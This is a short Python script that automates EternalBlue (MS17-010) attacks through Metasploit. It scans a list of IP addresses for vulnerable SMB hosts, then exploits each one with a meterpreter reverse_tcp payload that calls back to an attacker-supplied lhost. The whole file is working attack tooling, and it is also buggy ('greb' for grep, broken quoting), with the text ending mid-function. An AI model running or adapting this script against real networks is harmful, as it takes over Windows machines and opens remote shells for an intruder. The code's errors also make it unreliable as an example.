import subprocess
from termcolor import colored
import couchdb
import threading

def eternal_blue_Checker(live_IP):
    print colored("[-] Starting Scanning for Eternal Blue",'yellow')
    print colored("[-] Array Length of IP : "+str(len(live_IP)),'yellow')
    vuln_ip = []
    for i in live_IP:
        print colored("[+] Scanning "+ i ,'green')
        r = subprocess.check_output("msfconsole -x 'use auxiliary/scanner/smb/smb_ms17_010;set rhosts'"+i+";run;exit | greb VULNERABLE",shell = True)
        ip = r.split(" ")[1]
        ip = ip.split(":")[0]
        vuln_ip.append(ip)
        print colored("[+] Found Vulnerable IP : "+ip,'white' )
    #autoexploit(vuln_ip)
    return

# Auto Exploitation 
def autoexploit(vuln_ip,lhost):
    print colored("[-] Starting Auto Exploitation ",'yellow')
    exploited_ip = []
    for i in vuln_ip:
        print colored("[-] Exploiting : "+ i,'yellow')
        r = subprocess.check_output("msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue;set rhost'"+i+"; set payload windows/x64/meterpreter/reverse_tcp;set lhost "+lhost+";exploit;exit",shell= True)